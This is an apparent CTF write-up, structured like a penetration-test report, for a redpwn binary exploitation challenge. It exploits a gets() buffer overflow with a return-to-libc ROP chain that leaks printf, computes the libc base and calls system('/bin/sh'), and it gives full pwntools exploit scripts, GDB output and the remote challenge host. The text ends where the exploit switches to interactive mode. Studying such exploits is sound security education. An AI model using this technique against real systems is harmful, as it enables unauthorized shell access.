---
layout: post
title:  Ret2TheUnknown Writeup
description: This challenge was about exploiting a binary via a return-to-libc attack (due to the enabled NX bit). The address of printf was provided to faciliate exploitation, however it was only given after passing in user input. This address could not be used for future execution of the binary due to the presence of ASLR. Nevertheless, despite the presence of the enabled NX bit and ASLR, the binary was vulnerable.
date:   2021-07-31 
image:  '/images/0xd4y-logo-gray.png'
tags:   [Binex, Ret2Libc, ASLR Bypass]
---

<div>

<div>

# <span class="c13"></span>

</div>

<span>Ret2The-Unknown</span>

<span class="c53">Return-to-libc attack with ASLR</span>

<span class="c27 c52 c74">   </span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 345.92px; height: 358.88px;">![](/images/0xd4y-logo-gray.png)</span>

<span class="c27 c64">0xd4y</span>

<span class="c27 c75">July 31, 2021</span>

<span class="c39"></span>

<span class="c16">0xd4y Writeups</span>

<span class="c33">LinkedIn:</span> <span class="c37 c27">[https://www.linkedin.com/in/segev-eliezer/](https://www.google.com/url?q=https://www.linkedin.com/in/segev-eliezer/&sa=D&source=editors&ust=1653835801731588&usg=AOvVaw1Grn-uaig2_gtfSp7pdLUP)</span><span class="c27 c62 c73"> </span>

<span class="c33">Email:</span> <span class="c27 c37">[0xd4yWriteups@gmail.com](mailto:0xd4yWriteups@gmail.com)</span>

<span class="c33">Web:</span><span class="c27"> </span><span class="c37 c27">[https://0xd4y.github.io/](https://www.google.com/url?q=https://0xd4y.github.io/Writeups/&sa=D&source=editors&ust=1653835801732089&usg=AOvVaw00PARKRBcm5sczx-q2TDQo)</span><span class="c27"> </span>

<span class="c27 c67">Table of Contents</span>

<span class="c14 c33">[Executive Summary](#h.2gk743bl4yws)</span><span class="c14 c33">        </span><span class="c14 c33">[2](#h.2gk743bl4yws)</span>

<span class="c33">[Attack Narrative](#h.fwo658cjlflb)</span><span class="c33">        </span><span class="c33">[3](#h.fwo658cjlflb)</span>

<span class="c8">[Binary Analysis](#h.ne29o12hqmx)</span><span class="c8">        </span><span class="c8">[3](#h.ne29o12hqmx)</span>

<span class="c8">[Source Code](#h.s3etgisko63w)</span><span class="c8">        </span><span class="c8">[3](#h.s3etgisko63w)</span>

<span class="c8">[Behavior](#h.5bi2ub2pw035)</span><span class="c8">        </span><span class="c8">[4](#h.5bi2ub2pw035)</span>

<span class="c8">[Exploit Construction](#h.cnchbef0ghmr)</span><span class="c8">        </span><span class="c8">[6](#h.cnchbef0ghmr)</span>

<span class="c8">[GDB](#h.no9johlar4b7)</span><span class="c8">        </span><span class="c8">[6](#h.no9johlar4b7)</span>

<span class="c8">[PwnTools](#h.u22xqt10ni2q)</span><span class="c8">        </span><span class="c8">[8](#h.u22xqt10ni2q)</span>

<span class="c8">[Rerunning main()](#h.u0zf6m2396p)</span><span class="c8">        </span><span class="c8">[8](#h.u0zf6m2396p)</span>

<span class="c8">[Finding Base Libc Address](#h.7rxf70l4dide)</span><span class="c8">        </span><span class="c8">[9](#h.7rxf70l4dide)</span>

<span class="c8">[Building system(“/bin/sh”)](#h.g09gpw7xiphg)</span><span class="c8">        </span><span class="c8">[11](#h.g09gpw7xiphg)</span>

<span class="c8">[Exploit](#h.f8fs3vo8tohw)</span><span class="c8">        </span><span class="c8">[11](#h.f8fs3vo8tohw)</span>

<span class="c14 c33">[Conclusion](#h.susjdnco5e24)</span><span class="c14 c33">        </span><span class="c14 c33">[14](#h.susjdnco5e24)</span>

<span class="c8"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

# <span class="c61 c27 c62">Executive Summary</span>

<span class="c11"></span>

<span>The utilization of the insecure</span> <span class="c9">gets()</span><span>function resulted in a buffer overflow vulnerability. This security hole was exploited to execute arbitrary code despite the enabled NX bit via a return-to-libc attack. The deprecated</span> <span class="c9">gets()</span><span>function should be replaced with the more secure</span> <span class="c9">fgets()</span><span>alternative to prevent the attack mentioned in this report. It is highly suggested that the process running on port 31568 be terminated as soon as possible until the remediations outlined in the</span> <span class="c37">[Conclusion](#h.susjdnco5e24)</span><span> section are followed.</span><span class="c11">   </span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

# <span class="c62 c69">Attack Narrative</span>

<span class="c11"></span>

<span class="c11">The destination and port on which this binary is running were given:</span>

<a id="t.651980b98a510101f025cc436e95144d0c3efbf2"></a><a id="t.0"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c36" colspan="1" rowspan="1">

<span class="c5">Destination</span>

</td>

<td class="c36" colspan="1" rowspan="1">

<span class="c5">Port</span>

</td>

</tr>

<tr class="c22">

<td class="c36" colspan="1" rowspan="1">

<span class="c8">mc.ax</span>

</td>

<td class="c36" colspan="1" rowspan="1">

<span class="c8">31568</span>

</td>

</tr>

</tbody>

</table>

<span class="c11"></span>

<span class="c11">Additionally, the source code and libc file used by the binary were provided.</span>

## <span class="c13">Binary Analysis</span>

### <span class="c25">Source Code</span>

<a id="t.647211713a847ea6b0a337da793af7d46ccd3b3e"></a><a id="t.1"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c28">#</span><span class="c3">include</span><span class="c28"> <stdio.h></span><span class="c1">  
</span><span class="c28">#</span><span class="c3">include</span><span class="c28"> <string.h></span><span class="c1">  

</span><span class="c3">int</span><span class="c1"> </span><span class="c1 c41">main</span><span class="c1">(</span><span class="c3">void</span><span class="c1">)  
{  
 </span><span class="c3">char</span><span class="c1"> your_reassuring_and_comforting_we_will_arrive_safely_in_libc[32];  

 setbuf(</span><span class="c3">stdout</span><span class="c1">,</span> <span class="c28">NULL</span><span class="c1">);  
 setbuf(</span><span class="c3">stdin</span><span class="c1">,</span> <span class="c28">NULL</span><span class="c1">);  
 setbuf(</span><span class="c3">stderr</span><span class="c1">,</span> <span class="c28">NULL</span><span class="c1">);  

 </span><span class="c3">puts</span><span class="c1">(</span><span class="c1 c4">"that board meeting was a *smashing* success! rob loved the challenge!"</span><span class="c1">);  
 </span><span class="c3">puts</span><span class="c1">(</span><span class="c1 c4">"in fact, he loved it so much he sponsored me a business trip to this place called 'libc'..."</span><span class="c1">);  
 </span><span class="c3">puts</span><span class="c1">(</span><span class="c1 c4">"where is this place? can you help me get there safely?"</span><span class="c1">);  

 </span><span class="c1 c12">// please i cant afford the medical bills if we crash and segfault</span><span class="c1">  
 gets(your_reassuring_and_comforting_we_will_arrive_safely_in_libc);  

 </span><span class="c3">puts</span><span class="c1">(</span><span class="c1 c4">"phew, good to know. shoot! i forgot!"</span><span class="c1">);  
 </span><span class="c3">printf</span><span class="c1">(</span><span class="c1 c4">"rob said i'd need this to get there: %llx\n"</span><span class="c1">,</span> <span class="c3">printf</span><span class="c1">);  
 </span><span class="c3">puts</span><span class="c1">(</span><span class="c1 c4">"good luck!"</span><span class="c1">);  
}</span>

</td>

</tr>

</tbody>

</table>

<span class="c11"></span>

<span>At the top of the file, 32 bytes were allocated to the</span> <span class="c9">your_reassuring_and_comforting_we_will_arrive_safely_in_libc</span><span>buffer (for the sake of shortening this name, this buffer is called</span> <span class="c9">input_buffer</span><span>throughout this report). After initializing</span> <span class="c9">input_buffer</span><span>, a series of three</span> <span class="c9">setbuf()</span><span>calls are run, a function which controls the way a stream is buffered. Additionally, this function can control the size of the buffer, however due to the fact that the buffer argument is</span> <span class="c9">NULL</span><span>, the stream is unbuffered</span><sup>[[1]](#ftnt1)</sup><span class="c11">.</span>

<span>Following the</span> <span class="c9">setbuf()</span><span>calls is a succession of three</span> <span class="c9">puts()</span><span>calls before the insecure</span> <span class="c9">gets()</span><span>function is run with</span> <span class="c9">input_buffer</span><span>as the argument. After providing an input, the</span> <span class="c9">printf()</span><span class="c11"> function is called which prints out the address of printf in memory.</span>

### <span class="c25">Behavior</span>

<span>Looking at the security of the binary with the</span> <span class="c9">checksec</span><span class="c11"> command, it is found that the NX bit of the binary is enabled:</span>

<a id="t.95d62aa37732c539550bae187b8aecdcc8e2587e"></a><a id="t.2"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c1 c4">┌─[✗]─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]</span><span class="c1">  
</span><span class="c1 c4">└──╼</span><span class="c1"> </span><span class="c1 c4">$checksec</span><span class="c1"> </span><span class="c1 c4">ret2the-unknown</span><span class="c1">   
</span><span class="c1 c4">[*]</span><span class="c1"> </span><span class="c1 c4">'/home/0xd4y/business/ctf/redpwn/pwn/ret2the-unknown/ret2the-unknown'</span><span class="c1">Arch:</span> <span class="c1 c4">amd64-64-little</span><span class="c1">  
   RELRO:    </span><span class="c1 c4">Partial</span><span class="c1"> </span><span class="c1 c4">RELRO</span><span class="c1">  
   Stack:    </span><span class="c28">No</span><span class="c1"> </span><span class="c1 c4">canary</span><span class="c1"> </span><span class="c1 c4">found</span><span class="c1">NX:</span> <span class="c1 c4">NX</span><span class="c1"> </span><span class="c1 c4">enabled</span><span class="c1">  
   PIE:      </span><span class="c28">No</span><span class="c1"> </span><span class="c1 c4">PIE</span><span class="c1"> </span><span class="c1 c4">(0x400000)</span>

</td>

</tr>

</tbody>

</table>

<span class="c48">Note that this binary is 64-bit in little endianness</span>

<span>Therefore, the RIP cannot simply be overwritten to point to shellcode. However, the instruction pointer can easily be overwritten due to the lack of a stack canary. Furthermore, there is no PIE (Position Independent Executables) which means that the libc base can be calculated by finding the offset of the executables (this is examined in detail in the</span> <span class="c37">[Finding Base Libc Address](#h.7rxf70l4dide)</span><span> </span><span class="c11">section). This element is essential to the success of return-to-libc attacks.</span>

<span class="c11"> </span>

<span class="c11">When executing the binary, user input can be provided after the “safely?” string:</span>

<a id="t.c1b5f61e7956a404781952dba3f6d6f88452d14a"></a><a id="t.3"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c1">┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  
└──╼ $./ret2the-unknown  
</span><span class="c3">that</span><span class="c1">board meeting was a *smashing* success! rob loved</span> <span class="c3">the</span><span class="c1"> challenge!  
</span><span class="c3">in</span><span class="c1">fact, he loved</span> <span class="c3">it</span><span class="c1">so much he sponsored</span> <span class="c3">me</span><span class="c1">a business trip</span> <span class="c3">to</span><span class="c1"> this place called 'libc'...  
</span><span class="c3">where</span><span class="c1"> </span><span class="c3">is</span><span class="c1">this place? can you help</span> <span class="c3">me</span><span class="c1"> </span><span class="c3">get</span><span class="c1">there safely?  
test_string  
phew, good</span> <span class="c3">to</span><span class="c1">know. shoot! i forgot!  
rob said i'd need this</span> <span class="c3">to</span><span class="c1"> </span><span class="c3">get</span><span class="c1"> there: 7f8c6accfcf0  
good luck!</span>

</td>

</tr>

</tbody>

</table>

<span class="c11"></span>

<span>Only after providing an input, the binary printed out the address of</span> <span class="c9">printf()</span><span class="c11">. However, this address changes with each new execution of the binary:</span>

<a id="t.2c4212ce32a60945a7cfc2c0bdfae44810127085"></a><a id="t.4"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c1">┌─[✗]─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  
└──╼ $./ret2the-unknown  
that board meeting was a *smashing* success! rob loved the challenge!  
in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...  
where is this place? can you help me get there safely?  
a  
phew, good to know. shoot! i forgot!  
rob said i'd need this to get there:</span> <span class="c1 c20">7fd495f67cf0</span><span class="c1">good luck!  
┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  
└──╼ $./ret2the-unknown  
that board meeting was a *smashing* success! rob loved the challenge!  
in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...  
where is this place? can you help me get there safely?  
b  
phew, good to know. shoot! i forgot!  
rob said i'd need this to get there:</span> <span class="c1 c20">7fb847d38cf0</span><span class="c1">good luck!  
┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  
└──╼ $./ret2the-unknown  
that board meeting was a *smashing* success! rob loved the challenge!  
in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...  
where is this place? can you help me get there safely?  
c  
phew, good to know. shoot! i forgot!  
rob said i'd need this to get there:</span> <span class="c1 c63">7fac5a1c8cf0</span><span class="c1">  
good luck!</span>

</td>

</tr>

</tbody>

</table>

<span class="c48">The printf() address is shown in red</span>

<span class="c11">This change is evidence of the existence of ASLR (address space layout randomization), which is a security feature to help prevent memory corruption vulnerabilities. Therefore, the base address of libc cannot be easily calculated by subtracting the address of printf in the previous execution of the binary by the printf symbol in the given libc file.</span>

## <span class="c13">Exploit Construction</span>

### <span class="c25">GDB</span>

<span>Thus, to correctly calculate the libc base address, it is essential to overwrite RIP to point to</span> <span class="c9">main()</span><span class="c11"> so that the binary allows us to input a second payload (this time with the knowledge of the printf address). First, the offset of RIP must be calculated:</span>

<a id="t.7c5068acd7e6280e379a39b98c766f5e900f1ff6"></a><a id="t.5"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c1">┌─[0xd4y@Writeup]─[</span><span class="c1 c56">~/business/ctf/redpwn/pwn/ret2the-unknown]                                                                                                                            
└──╼ $gdb ./ret2the-unknown -q  
pwndbg</span><span class="c1">: loaded 196 commands. Type pwndbg [filter] for a list.  
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)  
Reading symbols from ./ret2the-unknown...  
(No debugging symbols found in ./ret2the-unknown)  
pwndbg> r < <(cyclic 100)              
Starting program: /home/0xd4y/business/ctf/redpwn/pwn/ret2the-unknown/ret2the-unknown < <(cyclic 100)  
that board meeting was a *smashing* success! rob loved the challenge!                            
in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...    
where is this place? can you help me get there safely?                                      
phew, good to know. shoot! i forgot!                                                            
rob said i'd need this to get there: 7ffff7e44cf0                                                
good luck!                                                                                      

Program received signal SIGSEGV, Segmentation fault.                                            
──────────────────────────────────────────[ DISASM ]──────────────────────────────────────────  
► 0x401237 <main+177>    ret    </span><span class="c1 c20"><0x6161616c6161616b></span><span class="c1">  

──────────────────────────────────────────[ STACK ]───────────────────────────────────────────  
00:0000│ rsp 0x7fffffffde38 ◂-- 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'  
01:0008│     0x7fffffffde40 ◂-- 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'  
02:0010│     0x7fffffffde48 ◂-- 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'  
03:0018│     0x7fffffffde50 ◂-- 'qaaaraaasaaataaauaaavaaawaaaxaaayaaa'  
04:0020│     0x7fffffffde58 ◂-- 'saaataaauaaavaaawaaaxaaayaaa'  
05:0028│     0x7fffffffde60 ◂-- 'uaaavaaawaaaxaaayaaa'  
06:0030│     0x7fffffffde68 ◂-- 'waaaxaaayaaa'  
07:0038│     0x7fffffffde70 ◂-- 0x61616179 /* 'yaaa' */  
────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────  
► f 0         0x401237 main+177  
  f 1 0x6161616c6161616b  
  f 2 0x6161616e6161616d  
  f 3 0x616161706161616f  
  f 4 0x6161617261616171  
  f 5 0x6161617461616173  
  f 6 0x6161617661616175  
  f 7 0x6161617861616177  
──────────────────────────────────────────────────────────────────────────────────────────────  
pwndbg> cyclic -l 0x6161616b  
40</span>

</td>

</tr>

</tbody>

</table>

<span class="c11"></span>

<span>The program received a segmentation fault error, and the offset of RIP was calculated to be 40 bytes. Therefore, upon inputting 40 junk bytes followed by the address of the main function, the program will repeat. Using the</span> <span class="c9">info functions</span><span class="c11"> GDB command, the address of the main function can be found:</span>

<a id="t.c35d614490b4e60ab1baf721646a495794cbc94c"></a><a id="t.6"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c1 c52">0x0000000000401186</span><span class="c1">  main</span>

</td>

</tr>

</tbody>

</table>

<span class="c11"></span>

<span>The overall exploit can be summarized into two waves: wave one consists of repeating the main function and retrieving the printf address, and wave two consists of calling the libc</span> <span class="c9">system()</span><span>function with</span> <span class="c9">/bin/sh</span><span class="c11"> as the argument.</span>

### <span class="c25">PwnTools</span>

#### <span class="c2">Rerunning main()</span>

<span>Using pwntools</span><sup>[[2]](#ftnt2)</sup><span class="c11">, a python library made for facilitating the process of writing binary exploits, we can create a program (which was named poc.py) to exploit the program:</span>

<a id="t.1a19db46dac67c8bd916b84d5ee3d55818e48a69"></a><a id="t.7"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c1">from pwn import *  

REMOTE = False  

if REMOTE:  
   p = remote(</span><span class="c1 c4">"mc.ax"</span><span class="c1">,31568)  
</span><span class="c1 c12">else:</span><span class="c1">  
   p = process(</span><span class="c1 c4">"./ret2the-unknown"</span><span class="c1">)  

rip_offset = 40  
main = 0x0000000000401186  
payload = b'A'*40 + p64(main)  

p.recvuntil(b</span><span class="c1 c4">"safely?"</span><span class="c1">)  
p.sendline(payload)  
p.interactive()</span>

</td>

</tr>

</tbody>

</table>

<span class="c11"></span>

<span class="c11">The code shown above first starts a local process for the binary. Afterwards, the payload is sent and an interactive instance is called to the process:</span>

<a id="t.4092f903d45bb943d40debbb3547e5efe870c317"></a><a id="t.8"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c1">┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  
└──╼ $python3 poc.py  
[+] Starting</span> <span class="c3">local</span><span class="c1">process './ret2the-unknown': pid 5749  
[*] Switching</span> <span class="c3">to</span><span class="c1">interactive mode  

phew, good</span> <span class="c3">to</span><span class="c1">know. shoot! i forgot!  
rob said i'd need this</span> <span class="c3">to</span><span class="c1"> </span><span class="c3">get</span><span class="c1"> there: 7f3f6e089cf0  
good luck!  
</span><span class="c3">that</span><span class="c1">board meeting was a *smashing* success! rob loved</span> <span class="c3">the</span><span class="c1"> challenge!  
</span><span class="c3">in</span><span class="c1">fact, he loved</span> <span class="c3">it</span><span class="c1">so much he sponsored</span> <span class="c3">me</span><span class="c1">a business trip</span> <span class="c3">to</span><span class="c1"> this place called 'libc'...  
</span><span class="c3">where</span><span class="c1"> </span><span class="c3">is</span><span class="c1">this place? can you help</span> <span class="c3">me</span><span class="c1"> </span><span class="c3">get</span><span class="c1"> there safely?  
</span><span class="c1 c20">$</span><span class="c1">test  
phew, good</span> <span class="c3">to</span><span class="c1">know. shoot! i forgot!  
rob said i'd need this</span> <span class="c3">to</span><span class="c1"> </span><span class="c3">get</span><span class="c1">there: 7f3f6e089cf0  
good luck!  
[*] Got EOF</span> <span class="c3">while</span><span class="c1">reading</span> <span class="c3">in</span><span class="c1"> interactive  
</span><span class="c1 c20">$</span><span class="c1">thanks!  
[*] Process './ret2the-unknown' stopped</span> <span class="c3">with</span><span class="c1"> </span><span class="c3">exit</span><span class="c1">code -11 (SIGSEGV) (pid 5749)  
[*] Got EOF</span> <span class="c3">while</span><span class="c1">sending</span> <span class="c3">in</span><span class="c1">interactive  
Traceback (most recent call</span> <span class="c3">last</span><span class="c1">):  
 File</span> <span class="c1 c4">"/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/process.py"</span><span class="c1">, line 787,</span> <span class="c3">in</span><span class="c1"> close  
   fd.close()  
BrokenPipeError: [Errno 32] Broken pipe</span>

</td>

</tr>

</tbody>

</table>

<span class="c11"></span>

<span class="c11">The main function was successfully called again. Now the printf function address can be retrieved to find the base libc address for the second wave of the exploit.</span>

#### <span class="c2">Finding Base Libc Address</span>

<span>With the knowledge of where the printf function is in memory, the base address of libc can be calculated, and therefore the address of</span> <span class="c9">system()</span><span>and location of the</span> <span class="c9">/bin/sh</span><span class="c11"> string can be determined by adding their offsets to the base libc address:</span>

<a id="t.cb12678f754839e18ce39175f68b30343b86dbcb"></a><a id="t.9"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c1 c14">from pwn import *  
</span>

<span class="c1">REMOTE = False  

if REMOTE:  
   p = remote(</span><span class="c1 c4">"mc.ax"</span><span class="c1">,31568)  
</span><span class="c1 c12">else:</span><span class="c1">  
   p = process(</span><span class="c1 c4">"./ret2the-unknown"</span><span class="c1">)  

rip_offset = 40  
main = 0x0000000000401186  

</span><span class="c1 c12"># Wave 1</span><span class="c1">  

</span><span class="c1 c12">## Repeat main function</span><span class="c1">  
payload = b'A'*40 + p64(main)  
p.recvuntil(b</span><span class="c1 c4">"safely?"</span><span class="c1">)  
p.sendline(payload)  

</span><span class="c1 c12">## Retrieve printf_address</span><span class="c1">  
</span><span class="c1">p.recvuntil(b</span><span class="c1 c4">"there: "</span><span class="c1">)</span><span class="c1">  
printf_address = p.recvuntil(b</span><span class="c1 c4">"luck!"</span><span class="c1">).split(b</span><span class="c1 c4">"\n"</span><span class="c1">)[0].decode()  

</span><span class="c1 c12"># Wave 2</span><span class="c1">  

</span><span class="c1 c12">## Get base libc address</span><span class="c1">  
libc = ELF(</span><span class="c1 c4">"libc-2.28.so"</span><span class="c1"> , checksec = False)  
libc.address = int(printf_address,16) - libc.symbols[</span><span class="c1 c4">"printf"</span><span class="c1">]  

</span><span class="c1 c12">## Get system and bin_sh addresses ready</span><span class="c1">  
system = libc.symbols[</span><span class="c1 c4">"system"</span><span class="c1">]  
bin_sh = next(libc.search(b</span><span class="c1 c4">"/bin/sh"</span><span class="c1">))  

log.success(f</span><span class="c1 c4">"libc base found at: {hex(libc.address)}"</span><span class="c1">)  
log.info(f</span><span class="c1 c4">"system at: {hex(system)}"</span><span class="c1">)  
log.info(f</span><span class="c1 c4">"/bin/sh at: {hex(bin_sh)}"</span><span class="c1">)  
p.interactive()</span>

</td>

</tr>

</tbody>

</table>

<span class="c11"></span>

<span>Observe the following addresses denoted in red when executing</span> <span class="c9">poc.py</span><span class="c11">:</span>

<a id="t.506372fb09587a820e6d3cecf9b6882e2d47ccab"></a><a id="t.10"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c1">┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  
└──╼ $python3 poc.py  
[+] Starting</span> <span class="c3">local</span><span class="c1">process './ret2the-unknown': pid 7483  
[+] libc base found</span> <span class="c3">at</span><span class="c1">:</span> <span class="c1 c20">0x7fe5b91a7790</span><span class="c1">[*] system</span> <span class="c3">at</span><span class="c1">:</span> <span class="c1 c20">0x7fe5b91ec150</span><span class="c1">[*] /bin/sh</span> <span class="c3">at</span><span class="c1">:</span> <span class="c1 c20">0x7fe5b9328ca9</span><span class="c1">[*] Switching</span> <span class="c3">to</span><span class="c1"> interactive mode  

</span><span class="c3">that</span><span class="c1">board meeting was a *smashing* success! rob loved</span> <span class="c3">the</span><span class="c1"> challenge!  
</span><span class="c3">in</span><span class="c1">fact, he loved</span> <span class="c3">it</span><span class="c1">so much he sponsored</span> <span class="c3">me</span><span class="c1">a business trip</span> <span class="c3">to</span><span class="c1"> this place called 'libc'...  
</span><span class="c3">where</span><span class="c1"> </span><span class="c3">is</span><span class="c1">this place? can you help</span> <span class="c3">me</span><span class="c1"> </span><span class="c3">get</span><span class="c1">there safely?  
$ test  
phew, good</span> <span class="c3">to</span><span class="c1">know. shoot! i forgot!  
rob said i'd need this</span> <span class="c3">to</span><span class="c1"> </span><span class="c3">get</span><span class="c1">there: 7fe5b91ffcf0  
good luck!  
[*] Got EOF</span> <span class="c3">while</span><span class="c1">reading</span> <span class="c3">in</span><span class="c1"> interactive</span>

</td>

</tr>

</tbody>

</table>

<span class="c11"></span>

<span>The exact address of</span> <span class="c9">system()</span><span>could be calculated due to the known offset of this function being</span> <span class="c1 c20">0x449c0</span><span>(which is</span> <span class="c1 c20">0x7fe5b91ec150</span><span>-</span> <span class="c1 c20">0x7fe5b91a7790</span><span class="c11">). Note that this works because PIE is disabled.</span>

#### <span class="c2">Building system(“/bin/sh”)</span>

<span>After discovering the addresses of the</span> <span class="c9">system()</span><span>function and</span> <span class="c9">/bin/sh</span><span>string, it follows that the</span> <span class="c9">system(“/bin/sh”)</span><span> call must be built and executed using the aforementioned addresses. To do so, it is important to be able to control the RDI register which is used to pass parameters into functions. The RDI, RSI, RDX, and RCX registers are all used for that purpose, but they function via a hierarchical basis, in which the parameter passed into a function follows that particular order</span><sup>[[3]](#ftnt3)</sup><span class="c11">:</span>

<a id="t.1c47d80aaae8c6be8df0643831b3cddbcd278e73"></a><a id="t.11"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c1 c41">some_function</span><span class="c1">(parameter1,parameter2,parameter3,parameter4)</span>

</td>

</tr>

</tbody>

</table>

<span class="c9">parameter1</span><span>corresponds to RDI,</span> <span class="c9">parameter2</span><span class="c11"> corresponds to RSI, and so on.</span>

<span class="c11"></span>

<span>Therefore, to pass</span> <span class="c9">/bin/sh</span><span>to</span> <span class="c9">system()</span><span>, it is important to pop the RDI register and pass in the desired parameter value. Using the</span> <span class="c9">ROPgadget --binary ret2the-unknown</span><span class="c11"> command, ROP gadgets that perform the desired pop operation can be found with their respective locations in memory:</span>

<a id="t.9c4dd327508f7e15c5908bf35bef7302f711aede"></a><a id="t.12"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c1">0x00000000004012a3 :</span> <span class="c3">pop</span><span class="c1"> </span><span class="c3">rdi</span><span class="c1"> </span><span class="c1 c12">; ret</span>

</td>

</tr>

</tbody>

</table>

## <span class="c13">Exploit</span>

<span class="c11">Using this gadget, the system() call will contain /bin/sh as its argument, and a shell will be returned:</span>

<a id="t.bbf07cfcc6ef8d2c4a27fe4e90eee26a25d11998"></a><a id="t.13"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c1">from pwn import *  

REMOTE = True  

if REMOTE:  
   p = remote(</span><span class="c1 c4">"mc.ax"</span><span class="c1">,31568)  
</span><span class="c1 c12">else:</span><span class="c1">  
   p = process(</span><span class="c1 c4">"./ret2the-unknown"</span><span class="c1">)  

rip_offset = 40  
main = 0x0000000000401186  

</span><span class="c1 c12"># Wave 1</span><span class="c1">  

</span><span class="c1 c12">## Repeat main function</span><span class="c1">  
payload = b'A'*40 + p64(main)  
p.recvuntil(b</span><span class="c1 c4">"safely?"</span><span class="c1">)  
p.sendline(payload)  

</span><span class="c1 c12"># Retrieve printf_address</span><span class="c1">  
</span><span class="c1 c12">p.recvuntil(b"there: ")</span><span class="c1">  
printf_address = p.recvuntil(b</span><span class="c1 c4">"luck!"</span><span class="c1">).split(b</span><span class="c1 c4">"\n"</span><span class="c1">)[0].decode()  

</span><span class="c1 c12">## Wave 2</span><span class="c1">  

</span><span class="c1 c12"># Get base libc address</span><span class="c1">  
libc = ELF(</span><span class="c1 c4">"libc-2.28.so"</span><span class="c1"> , checksec = False)  

print(libc.symbols[</span><span class="c1 c4">"system"</span><span class="c1">])  
libc.address = int(printf_address,16) - libc.symbols[</span><span class="c1 c4">"printf"</span><span class="c1">]  

</span><span class="c1 c12"># Get system and bin_sh address ready</span><span class="c1">  
system = libc.symbols[</span><span class="c1 c4">"system"</span><span class="c1">]  
bin_sh = next(libc.search(b</span><span class="c1 c4">"/bin/sh"</span><span class="c1">))  

log.success(f</span><span class="c1 c4">"libc base found at: {hex(libc.address)}"</span><span class="c1">)  
log.info(f</span><span class="c1 c4">"system at: {hex(system)}"</span><span class="c1">)  
log.info(f</span><span class="c1 c4">"/bin/sh at: {hex(bin_sh)}"</span><span class="c1">)  

</span><span class="c1 c12"># Creating the final payload</span><span class="c1">  
pop_rdi = 0x00000000004012a3  
payload = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)  

p.sendline(payload)  
p.interactive()</span>

</td>

</tr>

</tbody>

</table>

<span class="c11"></span>

<span class="c11">Running the exploit results in the successful return of a shell:</span>

<a id="t.2c54514597c2dd09ce818a40a78affe6df290e2a"></a><a id="t.14"></a>

<table class="c7">

<tbody>

<tr class="c22">

<td class="c0" colspan="1" rowspan="1">

<span class="c1">┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  
└──╼ $python3 poc.py  
[+] Opening connection</span> <span class="c3">to</span><span class="c1">mc.ax</span> <span class="c3">on</span><span class="c1">port 31568: Done  
281024  
[+] libc base found</span> <span class="c3">at</span><span class="c1">: 0x7ff17ea82000  
[*] system</span> <span class="c3">at</span><span class="c1">: 0x7ff17eac69c0  
[*] /bin/sh</span> <span class="c3">at</span><span class="c1">: 0x7ff17ec03519  
[*] Switching</span> <span class="c3">to</span><span class="c1"> interactive mode  

